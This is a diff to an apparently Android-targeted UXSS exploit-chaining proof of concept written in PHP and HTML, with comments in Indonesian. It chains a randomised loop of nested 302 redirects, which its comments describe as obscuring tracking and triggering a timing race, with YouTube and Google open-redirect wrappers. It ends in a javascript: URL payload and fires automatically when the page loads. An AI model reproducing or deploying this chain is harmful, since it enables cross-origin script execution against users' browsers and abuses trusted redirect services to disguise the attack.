@@ -10,14 +10,14 @@ if (isset($_GET['redirect'])) {
     // Payload akhir menggunakan skrip inline untuk mengevaluasi origin dinamis pada dokumen aktif
     $final_destination = "javascript:try{document.write('UXSS POC, Origin: ' + origin);}catch(e){document.write('Error: '+e.message);}";
 
-    // Loop pengalihan bertingkat untuk mengaburkan rentang pelacakan perantara
+    // Loop pengalihan bertingkat untuk mengaburkan rentang pelacakan dan memicu race condition timing
     if ($redirect_count < rand(10, 16)) {
         $redirect_count++;
         $next_url = "?service=" . urlencode($current_service) . "&redirect=1&count=" . $redirect_count;
         header("Location: " . $next_url, true, 302);
         exit();
     } else {
-        usleep(400000); // Penundaan mikro untuk stabilisasi navigasi terminal
+        usleep(300000); // Penundaan mikro untuk stabilisasi state navigasi terminal
         header("Location: " . $final_destination, true, 302);
         exit();
     }
@@ -28,7 +28,7 @@ if (isset($_GET['redirect'])) {
   <head>
     <meta charset="utf-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Kuatkan.html - Advanced Exploit Chaining PoC</title>
+    <title>Kuatkan.html - Advanced Android Exploit Chaining PoC</title>
     <style>
       body, html {
         margin: 0; padding: 0; height: 100vh; width: 100vw;
@@ -67,7 +67,7 @@ if (isset($_GET['redirect'])) {
         const currentBaseUrl = window.location.origin + window.location.pathname;
         const encodedParam = encodeURIComponent(currentBaseUrl + "?redirect=1&count=0");
 
-        // Wrapper pengalihan resmi
+        // Wrapper pengalihan resmi berbasis layanan target
         const youtubeUrl = 'https://www.youtube.com/redirect?q=' + encodedParam;
         const googleUrl = 'https://www.google.com/url?q=' + encodedParam + '&sa=D&sntz=1&usg=EXPLOIT_CHAIN_BYPASS_VECTOR';
 
@@ -81,19 +81,18 @@ if (isset($_GET['redirect'])) {
         function start() {
             statusInfo.innerText = "Status: Dispatching navigation target wrapper...";
             try {
-                // Membuka target melalui _self untuk menjaga kesinambungan history chaining
+                // Membuka target melalui _self dengan referensi jendela langsung untuk menjaga kesinambungan history chaining
                 window.open(url, '_self');
             } catch (err) {
                 statusInfo.innerText = "Status: Execution error: " + err.message;
             }
         }
 
-        // Auto-eksekusi pemicu saat dokumen selesai dimuat
+        // Auto-eksekusi pemicu saat dokumen selesai dimuat dengan sinkronisasi history state
         window.addEventListener("DOMContentLoaded", () => {
             setTimeout(() => {
                 if (!urlParams.has('redirect')) {
                     if (!urlParams.has('service')) {
-                        // Menetapkan parameter default secara otomatis jika belum ada di URL
                         history.replaceState(null, '', '?service=google&redirect=1&count=0');
                     }
                     start();
